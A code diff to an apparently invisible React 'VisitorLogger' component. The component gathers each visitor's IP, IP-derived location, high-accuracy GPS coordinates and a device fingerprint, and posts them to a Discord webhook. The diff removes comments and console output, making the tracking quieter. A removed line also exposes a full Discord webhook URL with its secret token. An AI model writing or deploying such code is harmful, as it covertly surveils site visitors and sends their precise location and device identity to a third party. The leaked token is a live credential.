@@ -6,13 +6,9 @@ export default function VisitorLogger() {
 
   useEffect(() => {
     const logVisit = async () => {
-      // 1. Prevent double-logging in this session
       if (sessionStorage.getItem('visited_logged')) return
-      
-      console.log('--- Logger Started ---')
 
       try {
-        // A. Network Identity (Initial IP-based)
         const [ipRes, locRes] = await Promise.all([
           fetch('https://api.ipify.org?format=json'),
           fetch('https://ipapi.co/json/')
@@ -29,18 +25,14 @@ export default function VisitorLogger() {
           data = await locRes.json()
         }
 
-        // B. Precise Location Attempt (GPS)
         const getGPSLocation = () => {
           return new Promise((resolve) => {
             if (!navigator.geolocation) {
-              console.warn('Geolocation not supported');
               return resolve(null);
             }
             
-            console.log('Requesting GPS Permission...');
             navigator.geolocation.getCurrentPosition(
               (pos) => {
-                console.log('GPS Success!');
                 resolve({
                   lat: pos.coords.latitude.toFixed(6),
                   lon: pos.coords.longitude.toFixed(6),
@@ -48,16 +40,12 @@ export default function VisitorLogger() {
                   source: '📍 Precise (GPS)'
                 });
               },
-              (err) => {
-                console.warn('GPS Error/Denied:', err.message);
-                resolve(null);
-              },
+              () => resolve(null),
               { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
             );
           });
         };
 
-        // Wait 1 second before asking for GPS to ensure browser is ready
         await new Promise(r => setTimeout(r, 1000));
         
         const gps = await getGPSLocation();
@@ -65,7 +53,6 @@ export default function VisitorLogger() {
         const finalLon = gps ? gps.lon : data.longitude;
         const locationSource = gps ? gps.source : '🏠 Approximate (IP)';
 
-        // C. Hardware Fingerprint
         const getDeviceInfo = async () => {
           const ua = navigator.userAgent;
           const uad = navigator.userAgentData;
@@ -154,7 +141,6 @@ export default function VisitorLogger() {
         const localTime = `${new Date().toLocaleDateString('en-GB', dateOptions)}, ${new Date().toLocaleTimeString('en-US', timeOptions)}`
         const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
 
-        // --- 2. FORMAT DISCORD MESSAGE ---
         const message = {
           embeds: [{
             title: "👤 New Visitor Detected",
@@ -201,16 +187,16 @@ export default function VisitorLogger() {
           }]
         }
 
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1521494519663558710/qXLELBMiZYEQrXBu15leEkwXkcWzryRh3YKBgi0vn5S_cIsl51n3Wo6x2fklcbrcGrAl';
-        await fetch(discordWebhookUrl, {
+        const discordWebhookUrl = process.env.REACT_APP_DISCORD_WEBHOOK_URL || process.env.VITE_DISCORD_WEBHOOK_URL;
+        if (discordWebhookUrl) {
+          await fetch(discordWebhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(message)
-          })
-          
-          sessionStorage.setItem('visited_logged', 'true')
-          console.log('--- Webhook Sent Successfully ---')
-
+          });
+        }
+        
+        sessionStorage.setItem('visited_logged', 'true')
       } catch (error) {
         console.error('Logger Error:', error)
       }
@@ -221,3 +207,4 @@ export default function VisitorLogger() {
 
   return null
 }
+
